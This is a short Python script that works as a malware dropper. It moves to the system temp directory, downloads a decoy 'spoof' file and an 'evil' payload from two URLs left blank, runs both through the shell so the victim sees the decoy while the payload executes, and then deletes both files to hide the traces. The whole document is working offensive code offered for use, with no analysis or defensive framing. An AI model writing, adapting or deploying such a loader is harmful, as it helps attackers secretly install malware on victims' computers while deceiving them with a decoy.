#!/usr/bin/env python3

import requests, os, tempfile, subprocess

def remove(spoof_file, evil_file):
    # Removes the downloaded file
    os.remove(spoof_file)
    os.remove(evil_file)

def execute(spoof_file, evil_file):
    # Execute the file downloaded
    subprocess.Popen(spoof_file, shell=True)
    subprocess.call(evil_file, shell=True)

def download(url):
    # Download the evil file to the temporary directory
    get_response = requests.get(url)
    # print(get_request.content)
    file_name = url.split("/")[-1]

    with open(file_name, "wb") as out_file:
        out_file.write(get_response.content)

    return file_name

def change_temp_dir():
    # Changes the directory to temporary directory
    temp_dir = tempfile.gettempdir()
    print(temp_dir)
    os.chdir(temp_dir)


# main code
url1 = ""   #path to spoof file
url2 = ""     #pathevil file
change_temp_dir()
spoof_file = download(url1)
evil_file = download(url2)
execute(spoof_file, evil_file)
remove(spoof_file, evil_file)


